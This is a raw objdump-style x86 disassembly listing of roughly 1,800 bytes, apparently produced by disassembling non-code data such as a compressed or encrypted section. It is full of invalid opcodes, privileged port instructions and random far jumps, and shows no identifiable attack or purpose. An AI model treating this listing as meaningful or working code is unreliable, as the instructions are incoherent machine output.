  415ca0:	mov    ds:0x253bcf99,al
  415ca5:	idiv   dh
  415ca7:	dec    ecx
  415ca8:	shr    DWORD PTR [ebx+0x757d4dd],1
  415cae:	lahf   
  415caf:	(bad)  [ecx-0x5d]
  415cb2:	pop    eax
  415cb3:	push   0xc9395ed2
  415cb8:	mov    ecx,0x7a071411
  415cbd:	aaa    
  415cbe:	in     al,dx
  415cbf:	cmp    BYTE PTR [edi],0x66
  415cc2:	sub    cl,dh
  415cc4:	adc    eax,0x5433f906
  415cc9:	and    esp,edx
  415ccb:	sub    ah,BYTE PTR [eax+0x724164cb]
  415cd1:	shr    DWORD PTR [eax-0x1e0b5c36],0x1
  415cd8:	test   eax,0x6bba4fea
  415cdd:	ret    0x7e49
  415ce0:	xchg   BYTE PTR [ebp-0x148bfe6d],ah
  415ce6:	pushf  
  415ce7:	repz xchg edi,eax
  415ce9:	pop    ebx
  415cea:	inc    ebp
  415ceb:	(bad)  
  415cec:	mov    eax,0x2ca439a8
  415cf1:	in     eax,dx
  415cf2:	lock sub BYTE PTR [edx-0x80],ch
  415cf6:	mov    bl,BYTE PTR [eax-0x33d189bc]
  415cfc:	mov    edx,0x6c0e6380
  415d01:	mov    al,ds:0x519db3e2
  415d06:	jnp    0x415ccc
  415d08:	inc    ecx
  415d09:	sub    bh,bl
  415d0b:	push   edx
  415d0c:	pop    ecx
  415d0d:	lods   eax,DWORD PTR ds:[esi]
  415d0e:	dec    eax
  415d0f:	sbb    edi,ebp
  415d11:	sbb    edx,DWORD PTR [ebx]
  415d13:	pop    DWORD PTR [eax]
  415d15:	mov    eax,0x4f3aa62
  415d1a:	jns    0x415cf0
  415d1c:	(bad)  [esi]
  415d1e:	aaa    
  415d1f:	shl    ebp,cl
  415d21:	aas    
  415d22:	clc    
  415d23:	xchg   ebx,eax
  415d24:	cmp    al,0x63
  415d26:	jns    0x415cc9
  415d28:	fsubr  st,st(0)
  415d2a:	jle    0x415d00
  415d2c:	sub    BYTE PTR [eax],dh
  415d2e:	(bad)  
  415d2f:	in     eax,0x2
  415d31:	ret    0x2687
  415d34:	adc    eax,0xfc231e7
  415d39:	mov    ds:0x266ee42,al
  415d3e:	xor    DWORD PTR [ecx-0x154fd80d],ebp
  415d44:	adc    DWORD PTR [ebp+0x7],edi
  415d47:	ret    0x3419
  415d4a:	rcl    BYTE PTR [eax],1
  415d4c:	push   eax
  415d4d:	out    dx,eax
  415d4e:	je     0x415db0
  415d50:	int    0x6d
  415d52:	jp     0x415d46
  415d54:	xchg   DWORD PTR [esi-0x5b6d29a1],esp
  415d5a:	add    eax,DWORD PTR [edi]
  415d5c:	xchg   ecx,eax
  415d5d:	(bad)  
  415d5e:	mov    esp,0xed2470de
  415d63:	js     0x415dc2
  415d65:	daa    
  415d66:	or     esi,DWORD PTR [eax]
  415d68:	mov    WORD PTR [esi],ss
  415d6a:	js     0x415d14
  415d6c:	and    bh,BYTE PTR [ebx+0x421f20d4]
  415d72:	outs   dx,BYTE PTR ds:[esi]
  415d73:	mov    dh,0x33
  415d75:	jnp    0x415dc3
  415d77:	pop    edx
  415d78:	arpl   WORD PTR [ebp-0x1b2d4715],bp
  415d7e:	outs   dx,BYTE PTR ds:[esi]
  415d7f:	aas    
  415d80:	sub    al,0xd2
  415d82:	sbb    dh,BYTE PTR [ecx-0x10]
  415d85:	fidiv  WORD PTR [edi+0xe]
  415d88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d89:	adc    esp,ebx
  415d8b:	xor    ebx,esp
  415d8d:	in     eax,0xfe
  415d8f:	stos   BYTE PTR es:[edi],al
  415d90:	xchg   edx,eax
  415d91:	jmp    0x4478:0xc0f0707d
  415d98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d99:	cmp    eax,0x3ea5678f
  415d9e:	call   0xa8885e9f
  415da3:	bound  esi,QWORD PTR [edx-0x129e9b9c]
  415da9:	adc    eax,DWORD PTR [ebx-0x41]
  415dac:	sbb    DWORD PTR [ebx-0x32],ebx
  415daf:	dec    ecx
  415db0:	dec    edx
  415db1:	outs   dx,BYTE PTR ds:[esi]
  415db2:	vandnps xmm5,xmm7,XMMWORD PTR [ebx]
  415db6:	dec    ebx
  415db7:	inc    edx
  415db8:	mov    dl,0x52
  415dba:	sar    ecx,0x4f
  415dbd:	dec    esi
  415dbe:	and    eax,0x10b82b1d
  415dc3:	add    edx,DWORD PTR [edx-0x25]
  415dc6:	pop    ebx
  415dc7:	dec    eax
  415dc8:	mov    ds:0x76d739b2,al
  415dcd:	lahf   
  415dce:	xchg   ebx,eax
  415dcf:	push   edx
  415dd0:	repz or al,0xc4
  415dd3:	inc    esp
  415dd4:	test   BYTE PTR [esi-0x69],dh
  415dd7:	ficomp DWORD PTR [edx]
  415dd9:	push   ss
  415dda:	pop    ss
  415ddb:	adc    dh,ah
  415ddd:	dec    eax
  415dde:	inc    edi
  415ddf:	test   eax,0x3865e029
  415de4:	add    DWORD PTR [ebp-0x3f],ebp
  415de7:	adc    DWORD PTR [ecx+0x2c],esp
  415dea:	dec    eax
  415deb:	dec    eax
  415dec:	mov    eax,ds:0xa3fc4e9c
  415df1:	(bad)  
  415df2:	outs   dx,DWORD PTR ds:[esi]
  415df3:	sbb    DWORD PTR [esi+0x65d11745],eax
  415df9:	push   es
  415dfa:	xchg   esp,eax
  415dfb:	in     al,dx
  415dfc:	sub    ah,al
  415dfe:	rcl    ecx,cl
  415e00:	div    dh
  415e02:	and    al,0x5
  415e04:	jmp    0x712e:0x45a0bd6e
  415e0b:	rcr    BYTE PTR [ebp-0x382170ca],cl
  415e11:	inc    esi
  415e12:	cmp    al,0x5f
  415e14:	inc    edi
  415e15:	push   edi
  415e16:	jo     0x415e6b
  415e18:	sbb    DWORD PTR [esi],esi
  415e1a:	mov    esi,DWORD PTR [ebx+0x37]
  415e1d:	sub    eax,0x50291787
  415e22:	xor    edi,DWORD PTR [ebx+0x5a6a33a2]
  415e28:	sar    eax,1
  415e2a:	xor    BYTE PTR [ecx-0x595d7504],dl
  415e30:	retf   0xf742
  415e33:	je     0x415e96
  415e35:	mov    ss,WORD PTR [edi-0x144b7ce6]
  415e3b:	fcom   QWORD PTR [ebx+0x5a]
  415e3e:	adc    esp,DWORD PTR [ecx+0x19]
  415e41:	xor    BYTE PTR [edx-0x21e9a798],0xc0
  415e48:	push   0x92fb5b9e
  415e4d:	mov    al,ds:0x1068b9fd
  415e52:	loop   0x415e0c
  415e54:	cmc    
  415e55:	test   BYTE PTR [eax],bh
  415e57:	or     esp,ebx
  415e59:	in     al,0xfb
  415e5b:	cmp    dl,0xb9
  415e5e:	dec    edx
  415e5f:	xchg   edi,eax
  415e60:	xchg   ebx,eax
  415e61:	and    dl,BYTE PTR [esi]
  415e63:	fstp   QWORD PTR [ebx+edx*8]
  415e66:	in     eax,0xc7
  415e68:	loop   0x415edd
  415e6a:	push   esp
  415e6b:	add    DWORD PTR [edx+0x6c],ecx
  415e6e:	add    al,0x22
  415e70:	jg     0x415e03
  415e72:	xor    cl,bh
  415e74:	cmp    BYTE PTR [esi+0x5824c728],0x95
  415e7b:	mov    edx,0xac3e4f8e
  415e80:	call   0x9c60:0x49586970
  415e87:	add    eax,0x97fc2b9
  415e8c:	mov    eax,0xe3b2b7b6
  415e91:	sbb    bl,ch
  415e93:	add    DWORD PTR [ecx],edx
  415e95:	jne    0x415e76
  415e97:	jle    0x415ed3
  415e99:	xchg   edi,eax
  415e9a:	pop    edx
  415e9b:	mov    esi,DWORD PTR [ebx]
  415e9d:	add    al,0x2b
  415e9f:	gs aad 0xdd
  415ea2:	xchg   ebx,eax
  415ea3:	xor    BYTE PTR [esi+0x18],cl
  415ea6:	add    edx,DWORD PTR [ebx+0x175101ec]
  415eac:	and    BYTE PTR [bx+si],dh
  415eaf:	mov    esi,0x72c34f95
  415eb4:	pop    ebx
  415eb5:	daa    
  415eb6:	xchg   ebp,eax
  415eb7:	inc    ebx
  415eb8:	ss out dx,eax
  415eba:	jl     0x415f1d
  415ebc:	mov    edx,DWORD PTR [ebp-0x5b83cc65]
  415ec2:	fdiv   DWORD PTR [ecx+0x1ddac55c]
  415ec8:	or     ch,dl
  415eca:	stos   BYTE PTR es:[edi],al
  415ecb:	push   ebx
  415ecc:	mov    al,ds:0xa6b8e740
  415ed1:	add    eax,esi
  415ed3:	push   edi
  415ed4:	and    BYTE PTR [edi+0x6c],dh
  415ed7:	inc    esp
  415ed8:	cwde   
  415ed9:	mov    ch,0x77
  415edb:	jb     0x415f35
  415edd:	add    al,0x62
  415edf:	out    dx,eax
  415ee0:	mov    cl,0x72
  415ee2:	cli    
  415ee3:	mov    dh,bl
  415ee5:	lahf   
  415ee6:	mov    dh,dh
  415ee8:	xchg   edi,eax
  415ee9:	mov    DWORD PTR [edi+eax*4-0x6e],0x25929b11
  415ef1:	data16 mov dl,BYTE PTR [edi+0x62e4da1c]
  415ef8:	add    bh,BYTE PTR [ebp-0x68]
  415efb:	pop    es
  415efc:	push   edi
  415efd:	or     esp,DWORD PTR [edx+0x5adaf6fb]
  415f03:	push   cs
  415f04:	xchg   esi,eax
  415f05:	scas   al,BYTE PTR es:[edi]
  415f06:	addr16 xchg ebp,eax
  415f08:	mov    esp,esi
  415f0a:	(bad)  
  415f0b:	xchg   ebp,eax
  415f0c:	fsubr  st,st(4)
  415f0e:	or     BYTE PTR [esi-0x69],dh
  415f11:	repnz fdivr QWORD PTR [esi]
  415f14:	push   0x4e691e08
  415f19:	xchg   esi,eax
  415f1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f1b:	mov    eax,ds:0x21b355f7
  415f20:	(bad)  
  415f22:	cmp    ebp,esi
  415f24:	jmp    0xbc838d50
  415f29:	mov    DWORD PTR [ebx],esp
  415f2b:	call   0x5c15:0x71bbdb60
  415f32:	shl    bl,cl
  415f34:	push   cx
  415f36:	inc    esp
  415f37:	dec    esp
  415f38:	xchg   DWORD PTR ds:0x641cff94,edi
  415f3e:	lock adc eax,DWORD PTR [eax-0x35f8df1b]
  415f45:	stos   BYTE PTR es:[edi],al
  415f46:	xor    ebx,DWORD PTR [ebx-0x6e]
  415f49:	(bad)  
  415f4a:	mov    esp,0x70593bfe
  415f4f:	(bad)  
  415f50:	int    0x16
  415f52:	xlat   BYTE PTR ds:[ebx]
  415f53:	or     BYTE PTR es:[edi+edi*8],al
  415f57:	adc    edi,eax
  415f59:	dec    ebx
  415f5a:	leave  
  415f5b:	mov    al,ds:0x2d6184ec
  415f60:	inc    ebx
  415f61:	mov    ebp,0xedc24f09
  415f66:	pop    ebp
  415f67:	int3   
  415f68:	fisttp DWORD PTR [ebp-0x33320be1]
  415f6e:	cmc    
  415f6f:	mov    dh,0x7
  415f71:	inc    ebx
  415f72:	(bad)  
  415f73:	push   esi
  415f74:	inc    ebp
  415f75:	sti    
  415f76:	sbb    edx,DWORD PTR [ebp-0x42d8e4bd]
  415f7c:	xor    dl,dl
  415f7e:	arpl   di,bp
  415f80:	mov    DWORD PTR ds:0x3a19e22c,eax
  415f86:	mov    bl,0x0
  415f88:	add    DWORD PTR [eax-0x5d95128],eax
  415f8e:	sahf   
  415f8f:	dec    esi
  415f90:	loopne 0x415f7d
  415f92:	mov    edx,0xd0df47b4
  415f97:	push   esi
  415f98:	jno    0x415f65
  415f9a:	or     esp,esi
  415f9c:	mov    eax,ds:0x6eb6a784
  415fa1:	inc    edx
  415fa2:	xchg   edi,eax
  415fa3:	bound  esp,QWORD PTR [edi+edi*1]
  415fa6:	xor    DWORD PTR [ecx],esp
  415fa8:	retf   0xec8
  415fab:	and    eax,0xeda708de
  415fb0:	sub    ebx,esi
  415fb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fb3:	adc    BYTE PTR [ebx-0x304191c7],dl
  415fb9:	je     0x415ff1
  415fbb:	sbb    eax,ebx
  415fbd:	push   0x59
  415fbf:	jp     0x415f9a
  415fc1:	in     eax,0x80
  415fc3:	or     BYTE PTR [esi+0x0],bh
  415fc6:	gs inc ebp
  415fc8:	cmp    BYTE PTR [edx],dl
  415fca:	aaa    
  415fcb:	xor    al,0xf
  415fcd:	mov    eax,DWORD PTR [edx+0x37]
  415fd0:	push   0xffffffd3
  415fd2:	xchg   ebx,eax
  415fd3:	ret    
  415fd4:	xchg   edi,eax
  415fd5:	icebp  
  415fd6:	fidiv  WORD PTR [edi]
  415fd8:	jge    0x416048
  415fda:	push   esp
  415fdb:	mov    edi,0x33fd47fd
  415fe0:	sbb    al,0x7a
  415fe2:	in     al,dx
  415fe3:	inc    edx
  415fe4:	repnz dec edx
  415fe6:	push   ds
  415fe7:	fsubrp st(6),st
  415fe9:	loopne 0x416032
  415feb:	jns    0x416052
  415fed:	xor    al,0x9c
  415fef:	mov    ebp,0x60c0d2e2
  415ff4:	sub    dl,cl
  415ff6:	(bad)  
  415ff7:	jnp    0x416019
  415ff9:	out    dx,eax
  415ffa:	js     0x416017
  415ffc:	repz pop edi
  415ffe:	and    esp,ebp
  416000:	imul   edi,ebx,0xf43499df
  416006:	jl     0x41602c
  416008:	pop    edi
  416009:	sub    eax,0x9f38f2e9
  41600e:	in     al,dx
  41600f:	mov    ebx,0x46eba42f
  416014:	lock adc al,0xc6
  416017:	imul   esi,DWORD PTR [ebp-0x5f],0x3d
  41601b:	fsubr  QWORD PTR [edx-0x64]
  41601e:	xor    al,0xaf
  416020:	xchg   ebp,eax
  416021:	stos   BYTE PTR es:[edi],al
  416022:	mov    bl,BYTE PTR [edi-0x11584f76]
  416028:	loopne 0x41607c
  41602a:	shl    bh,cl
  41602c:	xchg   BYTE PTR [eax-0x7e],bh
  41602f:	ja     0x415fda
  416031:	pop    ebx
  416032:	and    al,0x5f
  416034:	jne    0x416043
  416036:	stos   DWORD PTR es:[edi],eax
  416037:	ins    DWORD PTR es:[edi],dx
  416038:	jns    0x416011
  41603a:	jg     0x4160b9
  41603c:	jae    0x41600f
  41603e:	das    
  41603f:	not    dh
  416041:	out    dx,eax
  416042:	imul   edi,DWORD PTR [eax],0x9c199c34
  416048:	push   eax
  416049:	(bad)  
  41604a:	push   ss
  41604b:	push   0x6e
  41604d:	retf   
  41604e:	xor    ebx,0xe91f40ac
  416054:	leave  
  416055:	adc    ecx,DWORD PTR [ecx-0x64]
  416058:	mov    dh,0x9e
  41605a:	ds loope 0x416087
  41605d:	(bad)  
  41605e:	xor    edx,DWORD PTR [ebx+0x5ebc8406]
  416064:	dec    ecx
  416065:	adc    DWORD PTR [ebx],edx
  416067:	into   
  416068:	test   bl,0x52
  41606b:	stos   BYTE PTR es:[edi],al
  41606c:	pop    edi
  41606d:	(bad)  
  41606e:	push   0x5cfc9f32
  416073:	xlat   BYTE PTR ds:[ebx]
  416074:	inc    ebx
  416075:	xchg   esp,eax
  416076:	retf   
  416077:	mov    WORD PTR [edx],gs
  416079:	fst    st(5)
  41607b:	inc    ebx
  41607c:	mov    eax,ds:0x12d68d8
  416081:	sbb    DWORD PTR [edi-0x4e25cdb8],edx
  416087:	stos   DWORD PTR es:[edi],eax
  416088:	out    dx,eax
  416089:	sub    bh,0xb9
  41608c:	fsub   QWORD PTR [edx+0x5b1a16a5]
  416092:	pop    ebp
  416093:	sbb    esp,esp
  416095:	sbb    esp,DWORD PTR [esp+eax*1-0x74]
  416099:	aaa    
  41609a:	xor    DWORD PTR [edx+0x2b],ebp
  41609d:	sti    
  41609e:	jne    0x41606a
  4160a0:	daa    
  4160a1:	ret    
  4160a2:	inc    eax
  4160a3:	add    esp,DWORD PTR [ebx+0x30a72a0]
  4160a9:	dec    eax
  4160aa:	arpl   si,si
  4160ac:	adc    eax,0xf99bb8d8
  4160b1:	sbb    ebp,DWORD PTR [esp+edx*1-0x19]
  4160b5:	cmp    dh,ch
  4160b7:	pushf  
  4160b8:	cmp    al,0xd6
  4160ba:	nop
  4160bb:	mov    edx,0x9057581a
  4160c0:	and    BYTE PTR [edx],cl
  4160c2:	clc    
  4160c3:	pop    es
  4160c4:	xchg   BYTE PTR [edx+0xe],bh
  4160c7:	dec    esi
  4160c8:	sub    eax,ecx
  4160ca:	or     al,0x1c
  4160cc:	pop    edx
  4160cd:	popa   
  4160ce:	inc    esi
  4160cf:	fs in  al,dx
  4160d1:	(bad)  
  4160d2:	pop    ecx
  4160d3:	dec    edi
  4160d4:	cmc    
  4160d5:	sub    eax,0x8c03816c
  4160da:	shr    BYTE PTR [edx-0x7b],0x9f
  4160de:	sahf   
  4160df:	push   esi
  4160e0:	add    al,0x26
  4160e2:	jns    0x4160ff
  4160e4:	popf   
  4160e5:	ins    BYTE PTR es:[edi],dx
  4160e6:	xchg   ecx,eax
  4160e7:	and    DWORD PTR [bp+si-0x24b2],ecx
  4160ec:	jge    0x41607f
  4160ee:	push   0x73
  4160f0:	int    0x59
  4160f2:	ja     0x4160af
  4160f4:	add    esi,DWORD PTR [ebp-0x40f12e32]
  4160fa:	cmp    cl,al
  4160fc:	sbb    DWORD PTR [edi+eax*1-0x20],0xefb030b3
  416104:	mov    eax,ds:0x3d84fd06
  416109:	cmp    eax,0xb622fc47
  41610e:	xor    cl,BYTE PTR [ecx+0x543c6251]
  416114:	jbe    0x416177
  416116:	gs mov edx,0xe4b16d01
  41611c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41611d:	sbb    DWORD PTR [ecx+0xda8f38b],ebp
  416123:	pop    DWORD PTR [edx-0x77ba91b8]
  416129:	xlat   BYTE PTR ds:[ebx]
  41612a:	mov    ecx,DWORD PTR [ecx-0x7d]
  41612d:	add    ecx,DWORD PTR ds:0xfdcf1646
  416133:	cwde   
  416134:	jb     0x416136
  416136:	mov    ebp,0xf31cf9f2
  41613b:	test   al,0x9f
  41613d:	jmp    0x603a:0xdb94a04a
  416144:	int3   
  416145:	fs pop es
  416147:	push   es
  416148:	mov    cs,WORD PTR cs:[ecx]
  41614b:	sub    al,BYTE PTR [eax+0x3b]
  41614e:	fwait
  41614f:	(bad)  
  416150:	clc    
  416151:	push   es
  416152:	ret    0x9c76
  416155:	stos   BYTE PTR es:[edi],al
  416156:	xchg   edx,eax
  416157:	pop    esp
  416158:	xchg   ebx,eax
  416159:	or     al,0x63
  41615b:	test   eax,0x7f3f63b7
  416160:	fiadd  DWORD PTR [edi-0x6c]
  416163:	adc    esp,0xffffffd9
  416166:	fcomp  QWORD PTR [eax]
  416168:	outs   dx,BYTE PTR ds:[esi]
  416169:	push   es
  41616a:	pop    edi
  41616b:	mov    ebp,0xe690cdd0
  416170:	ret    0x1e57
  416173:	stc    
  416174:	cs push eax
  416176:	call   0xcc95e184
  41617b:	jo     0x416119
  41617d:	fcmovnbe st,st(4)
  41617f:	xor    cl,BYTE PTR [ebx+0x67]
  416182:	fwait
  416183:	xchg   BYTE PTR [ebx-0x2c42b140],ah
  416189:	repnz mov cl,0x52
  41618c:	aaa    
  41618d:	outs   dx,DWORD PTR ds:[esi]
  41618e:	das    
  41618f:	jns    0x416156
  416191:	fs std 
  416193:	pop    eax
  416194:	inc    edx
  416195:	sbb    eax,0x35f58e6f
  41619a:	or     DWORD PTR [eax+esi*1],ebp
  41619d:	push   esp
  41619e:	xchg   esi,eax
  41619f:	fnstenv ds:0x74b997ee
  4161a5:	cmp    esi,ecx
  4161a7:	iret   
  4161a8:	jp     0x41615a
  4161aa:	data16 (bad) 
  4161ac:	pop    ebx
  4161ad:	adc    DWORD PTR [ecx+0x9],0x7151d23c
  4161b4:	int    0xb9
  4161b6:	rcr    BYTE PTR [edx],0xff
  4161b9:	sbb    edi,DWORD PTR [edi]
  4161bb:	sub    eax,0x1a9150d6
  4161c0:	stos   DWORD PTR es:[edi],eax
  4161c1:	push   0x89d92ca3
  4161c6:	inc    ebp
  4161c7:	push   ebp
  4161c8:	sti    
  4161c9:	cmp    al,0x65
  4161cb:	mov    WORD PTR [esi+0x35],es
  4161ce:	xchg   ebx,eax
  4161cf:	push   cs
  4161d0:	mov    cl,BYTE PTR [edi]
  4161d2:	imul   eax,DWORD PTR [ecx+0x72],0xb0e7b2b
  4161d9:	aaa    
  4161da:	adc    al,0x6e
  4161dc:	mov    ebx,DWORD PTR [eax-0x73]
  4161df:	js     0x4161a2
  4161e1:	adc    BYTE PTR [ebp+0x50ed1ec3],bh
  4161e7:	dec    edx
  4161e8:	call   0xc3a9:0xc898c7
  4161ef:	jbe    0x416214
  4161f1:	lahf   
  4161f2:	xchg   ecx,eax
  4161f3:	int3   
  4161f4:	cmp    ecx,edx
  4161f6:	pop    edx
  4161f7:	rol    BYTE PTR [ecx+0x57],0xf7
  4161fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161fc:	jle    0x416260
  4161fe:	sub    eax,0x59faaf53
  416203:	imul   ebp,DWORD PTR [eax],0xffffffe6
  416206:	loope  0x416244
  416208:	inc    eax
  416209:	popf   
  41620a:	nop
  41620b:	ds xor ah,ch
  41620e:	and    al,0x5e
  416210:	mov    bl,0x51
  416212:	loope  0x416261
  416214:	inc    edi
  416215:	jge    0x416238
  416217:	cwde   
  416218:	fimul  DWORD PTR [ecx+0x7a]
  41621b:	mov    ebp,ebx
  41621d:	test   DWORD PTR [ecx+0x2f],ebx
  416220:	push   ebx
  416221:	std    
  416222:	ja     0x41625f
  416224:	push   eax
  416225:	ret    
  416226:	and    al,0xfd
  416228:	fisubr WORD PTR [bx+di-0x6484]
  41622d:	sub    cl,BYTE PTR [edi+0x31]
  416230:	mov    ds:0xbf5bf7ec,al
  416235:	pop    ds
  416236:	shl    DWORD PTR [ebx-0xa76327e],1
  41623c:	ror    BYTE PTR [esi+0x65a15e24],1
  416242:	cmp    eax,0x67a1474c
  416247:	sub    DWORD PTR [ebx],ecx
  416249:	add    dl,bl
  41624b:	jmp    0x1212:0x27049b5e
  416252:	jl     0x4161d4
  416254:	or     eax,0x24bf105a
  416259:	xchg   ebx,eax
  41625a:	imul   edi,DWORD PTR [ecx],0xffffffdf
  41625d:	repz jbe 0x416228
  416260:	inc    eax
  416261:	ins    BYTE PTR es:[edi],dx
  416262:	call   0x57e3:0x70859fed
  416269:	jmp    0x75d55361
  41626e:	shl    BYTE PTR [edi-0x5c],cl
  416271:	mov    DWORD PTR [edi+0x54],esi
  416274:	cs scas al,BYTE PTR es:[edi]
  416276:	popf   
  416277:	inc    ecx
  416278:	mov    dh,0xcd
  41627a:	mov    eax,0xc44e6fad
  41627f:	imul   esi,ecx,0xfffffffb
  416282:	retf   
  416283:	std    
  416284:	xchg   edx,eax
  416285:	push   0xffffff83
  416287:	jnp    0x416300
  416289:	repz rdpmc 
  41628c:	inc    ecx
  41628d:	pushf  
  41628e:	lea    ebx,[ebx]
  416290:	ins    DWORD PTR es:[edi],dx
  416291:	sbb    DWORD PTR fs:[eax-0x567c000e],edx
  416298:	test   DWORD PTR [edi],esp
  41629a:	repz ret 
  41629c:	addr16 es xchg ecx,eax
  41629f:	mov    esi,0x70c6f5c2
  4162a4:	adc    eax,0x72ad0cb2
  4162a9:	xchg   ah,ch
  4162ab:	lea    eax,[ecx]
  4162ad:	inc    edx
  4162ae:	fucomp st(7)
  4162b0:	test   eax,0x3bbdf9f1
  4162b5:	sub    al,BYTE PTR [edx+0x57]
  4162b8:	lock inc eax
  4162ba:	adc    DWORD PTR [edx+0x5c68be30],ebp
  4162c0:	int3   
  4162c1:	and    dh,cl
  4162c3:	pop    esp
  4162c4:	xor    DWORD PTR [esi+ebp*4],ebp
  4162c7:	mov    eax,0x72a4b628
  4162cc:	push   cs
  4162cd:	jmp    0x416253
  4162cf:	ds jnp 0x4162de
  4162d2:	shl    BYTE PTR [edi+edi*1],0x42
  4162d6:	sub    al,0x35
  4162d8:	add    DWORD PTR [ecx],esi
  4162da:	(bad)  
  4162db:	inc    ebp
  4162dc:	add    eax,0xda0bfd86
  4162e1:	aad    0xbc
  4162e3:	ret    0xed00
  4162e6:	arpl   WORD PTR [ecx],ax
  4162e8:	sbb    eax,0xeb129ee2
  4162ed:	repz out 0x4d,al
  4162f0:	lods   eax,DWORD PTR ds:[esi]
  4162f1:	cmp    ebp,eax
  4162f3:	mov    ds:0x346542f3,al
  4162f8:	dec    ecx
  4162f9:	jmp    0xa4266981
  4162fe:	dec    ebp
  4162ff:	mov    ds:0x9e1c1164,eax
  416304:	add    al,0x64
  416306:	les    ebp,FWORD PTR [esi-0x1a34c579]
  41630c:	lea    edx,[esi-0x37]
  41630f:	dec    ebx
  416310:	sub    al,0xba
  416312:	xchg   esi,eax
  416313:	sbb    DWORD PTR [esi],ecx
  416315:	cmp    BYTE PTR [ebx],0x45
  416318:	call   0x3fe7107d
  41631d:	inc    ebx
  41631e:	inc    ebx
  41631f:	popf   
  416320:	pop    esp
  416321:	test   al,0xfd
  416323:	jge    0x416355
  416325:	out    0x27,al
  416327:	inc    edx
  416328:	sub    esi,DWORD PTR cs:[eax-0x28ca7f45]
  41632f:	xor    ebp,edx
  416331:	xor    eax,0x1db31d08
  416336:	(bad)  
  416337:	dec    eax
  416338:	jb     0x4162f1
  41633a:	jmp    0xd859:0x363c6f42
  416341:	pusha  
  416342:	test   eax,0x8f54d469
  416347:	js     0x416348
  416349:	pop    esi
  41634a:	pop    ecx
  41634b:	dec    esi
  41634c:	in     al,dx
  41634d:	and    al,0x21
  41634f:	lock cmp bl,BYTE PTR [esi+0x53]
  416353:	psrlw  mm3,QWORD PTR [eax+ebp*2]
  416357:	adc    al,0xf2
  416359:	je     0x4163af
  41635b:	int3   
  41635c:	int3   
  41635d:	adc    DWORD PTR [eax-0x71],edi
  416360:	jmp    0x74d674d
  416365:	addr16 mov al,0x94
  416368:	jg     0x416335
  41636a:	pop    ebp
  41636b:	cs pop esp
  41636d:	mov    dh,0x6a
  41636f:	add    cl,BYTE PTR [esp+esi*8-0x1152b21e]
  416376:	adc    dh,BYTE PTR [ecx]
  416378:	ror    DWORD PTR [eax-0x51],cl
  41637b:	sbb    bl,BYTE PTR [ecx]
  41637d:	xor    eax,DWORD PTR [edi]
  41637f:	jo     0x416343
  416381:	and    BYTE PTR ds:[ebp+ebx*4+0x37],dl
  416386:	dec    edx
  416387:	cmp    dl,al
  416389:	pop    ss
  41638a:	inc    ebp
  41638b:	mov    bh,0xd0
  41638d:	retf   0x20a9
  416390:	mov    edi,0x7c6130d
  416395:	ror    DWORD PTR [eax],1
  416397:	fs jno 0x416327
  41639a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41639b:	stc    
  41639c:	mov    edi,0xbf3d14d7
  4163a1:	adc    DWORD PTR [eax],edx
  4163a3:	pop    ss
  4163a4:	push   ecx
  4163a5:	rol    BYTE PTR [esi+0x7e83bf35],1
  4163ab:	lahf   
  4163ac:	jl     0x41639a
  4163ae:	inc    ecx
  4163af:	adc    dl,dh
  4163b1:	lock jmp 0x4163ea
  4163b4:	cmp    DWORD PTR [ebx-0x6dfbdd40],eax
  4163ba:	shr    BYTE PTR [edx+0x434f554],cl
  4163c0:	xor    al,0xe4
  4163c2:	push   ecx
  4163c3:	push   ds
  4163c4:	mov    ah,0x7f
  4163c6:	in     eax,0xf2
  4163c8:	fisub  WORD PTR [edx]
  4163ca:	in     al,0x63
  4163cc:	mov    WORD PTR [ebx],gs
  4163ce:	repnz outs dx,BYTE PTR ds:[esi]
  4163d0:	xchg   ebp,eax
  4163d1:	and    DWORD PTR [edi+0x19648efd],0x27
  4163d8:	mov    ecx,0xf5a4b44d
  4163dd:	popf   
  4163de:	xchg   DWORD PTR [ebp-0x60fe5b11],eax
  4163e4:	out    dx,eax
  4163e5:	jmp    0x364d:0xffb9b170
  4163ec:	mov    dh,0x12
  4163ee:	mov    ebp,0xa37dcca4
  4163f3:	call   DWORD PTR [edi-0x1b]
  4163f6:	dec    ebx
  4163f7:	cld    
  4163f8:	loope  0x416411
  4163fa:	and    dh,0x24
  4163fd:	dec    ebp
  4163fe:	bound  eax,QWORD PTR [esi]
  416400:	jno    0x416399
  416402:	xor    edx,DWORD PTR [esi-0x3e]
  416405:	gs mov bl,0x53
  416408:	mov    ah,0xb4
  41640a:	test   DWORD PTR [edi+0x7],0x35805fc8
  416411:	and    eax,0x296bd738
  416416:	cli    
  416417:	sbb    DWORD PTR [ebx],0xffffffe8
  41641a:	jne    0x41639e
  41641c:	dec    ebx
  41641d:	test   al,0x51
  41641f:	ins    BYTE PTR es:[edi],dx
  416420:	les    ebx,FWORD PTR [eax-0x2efa2ef]
  416426:	retf   0x95ad
  416429:	xor    DWORD PTR [ebx+ebx*8+0x56ce7d9c],0xf7a5fac1
  416434:	mov    ecx,0x442389e
  416439:	int    0xab
  41643b:	add    al,BYTE PTR [ecx-0x66b112fa]
  416441:	mov    ebp,DWORD PTR [esi-0x358bb04c]
  416447:	lahf   
  416448:	adc    DWORD PTR [ebx+0x33],eax
  41644b:	and    al,0x53
  41644d:	call   0xd2d2:0x28895f0c
  416454:	ret    0x11fc
  416457:	call   0xdf46bf92
  41645c:	sub    BYTE PTR [edx+0x4d5267fd],bh
  416462:	(bad)  
  416463:	or     eax,DWORD PTR [ebp-0x10576cda]
  416469:	cmc    
  41646a:	(bad)  
  41646c:	push   edx
  41646d:	test   DWORD PTR [esi],0xc188ab8b
  416473:	test   BYTE PTR [edi-0x10],bh
  416476:	addr16 cmp ah,bh
  416479:	pop    ds
  41647a:	xchg   BYTE PTR [ebx+edx*4],al
  41647d:	add    al,0xff
  41647f:	mov    ch,0xcb
  416481:	mov    bl,0x34
  416483:	popa   
  416484:	push   0x6a
  416486:	inc    ebx
  416487:	jg     0x4164e8
  416489:	mov    ebx,0x9eaae342
  41648e:	add    DWORD PTR [ecx],eax
  416490:	imul   BYTE PTR [edi]
  416492:	mov    ds:0x63248af1,al
